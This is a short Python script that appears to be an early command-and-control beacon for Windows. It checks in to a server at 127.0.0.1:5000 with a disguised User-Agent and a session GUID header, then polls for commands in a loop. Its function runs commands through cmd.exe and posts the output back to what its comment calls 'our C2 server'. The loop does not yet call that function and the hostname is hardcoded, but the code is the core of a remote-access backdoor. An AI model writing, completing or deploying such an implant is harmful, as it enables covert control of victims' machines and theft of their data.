import subprocess
import requests
import time
import uuid
import base64

def bleh(beacon_command, GUID):
    """
    This takes in a string to execute
    Returns nothing
    Sends the command output in a post to our C2 server
    """
    # DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
    command = ['cmd.exe', '/c', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    requests.post('http://127.0.0.1:5000/schema', data=out, headers=headers, verify=False)

GUID = uuid.uuid4()
GUID = GUID.int
command = ['cmd.exe', '/c', 'hostname']
#process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
#out, err = process.communicate()
hostname = "test"
hostname = hostname.strip()
print(hostname)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1)',
    'APPSESSIONID': f'{GUID}',
    'RESPONSE': f'{hostname}'
}

# Send our HELLO/GUID
requests.get(f'http://127.0.0.1:5000/', headers=headers, verify=False)

while 1:
    # The requests function sends a GET with the headers we setup and the GUID as the URL path. This regenerates on each new run
    # This is only to retrieve new commands though
    a = requests.get(f'http://127.0.0.1:5000/session', headers=headers, verify=False)
    cmd = a.text
    print(cmd)
    print('got command')

    time.sleep(5)